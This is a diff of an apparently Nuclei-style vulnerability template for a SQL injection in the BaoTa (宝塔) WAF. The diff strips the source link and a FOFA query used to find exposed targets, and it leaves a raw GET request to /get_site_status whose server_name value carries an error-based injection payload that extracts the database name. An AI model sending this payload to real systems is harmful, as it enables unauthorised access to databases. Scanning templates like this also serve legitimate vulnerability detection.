@@ -3,12 +3,8 @@ info:
   name: 宝塔WAF SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nzipt0ui2q0g3u9g'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nzipt0ui2q0g3u9g
-    fofa: title=="404 - Website not exist!"
 http:
 - raw:
   - 'GET /get_site_status?server_name=''-extractvalue(1,concat(0x5c,database()))-'' HTTP/2
